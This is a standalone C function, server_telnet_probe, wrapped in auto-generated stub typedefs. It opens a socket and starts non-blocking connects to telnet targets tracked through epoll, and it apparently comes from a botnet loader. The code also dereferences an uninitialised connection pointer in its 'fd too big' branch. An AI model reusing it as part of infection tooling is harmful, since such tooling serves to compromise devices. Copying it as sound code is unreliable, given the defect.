
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


struct telnet_info {int port; int addr; } ;
struct TYPE_3__ {int s_addr; } ;
struct sockaddr_in {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct server_worker {int efd; } ;
struct server {size_t workers_len; int max_open; struct connection** estab_conns; int curr_open; int curr_worker_child; struct server_worker* workers; } ;
struct TYPE_4__ {int fd; } ;
struct epoll_event {int events; TYPE_2__ data; } ;
struct connection {int fd; struct server* srv; int info; } ;


 int AF_INET ;
 int ATOMIC_DEC (int *) ;
 size_t ATOMIC_INC (int *) ;
 scalar_t__ EINPROGRESS ;
 int EPOLLOUT ;
 int EPOLL_CTL_ADD ;
 int connect (int,struct sockaddr*,int) ;
 int connection_close (struct connection*) ;
 int connection_open (struct connection*) ;
 int epoll_ctl (int ,int ,int,struct epoll_event*) ;
 scalar_t__ errno ;
 int memcpy (int *,struct telnet_info*,int) ;
 int printf (char*) ;
 int time (int *) ;
 int util_socket_and_bind (struct server*) ;

void server_telnet_probe(struct server *srv, struct telnet_info *info)
{
    int fd = util_socket_and_bind(srv);
    struct sockaddr_in addr;
    struct connection *conn;
    struct epoll_event event;
    int ret;
    struct server_worker *wrker = &srv->workers[ATOMIC_INC(&srv->curr_worker_child) % srv->workers_len];

    if (fd == -1)
    {
        if (time(((void*)0)) % 10 == 0)
        {
            printf("Failed to open and bind socket\n");
        }
        ATOMIC_DEC(&srv->curr_open);
        return;
    }
    while (fd >= (srv->max_open * 2))
    {
        printf("fd too big\n");
        conn->fd = fd;



        connection_close(conn);
        return;
    }

    if (srv == ((void*)0))
        printf("srv == NULL 4\n");

    conn = srv->estab_conns[fd];
    memcpy(&conn->info, info, sizeof (struct telnet_info));
    conn->srv = srv;
    conn->fd = fd;
    connection_open(conn);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = info->addr;
    addr.sin_port = info->port;
    ret = connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
    if (ret == -1 && errno != EINPROGRESS)
    {
        printf("got connect error\n");
    }

    event.data.fd = fd;
    event.events = EPOLLOUT;
    epoll_ctl(wrker->efd, EPOLL_CTL_ADD, fd, &event);
}
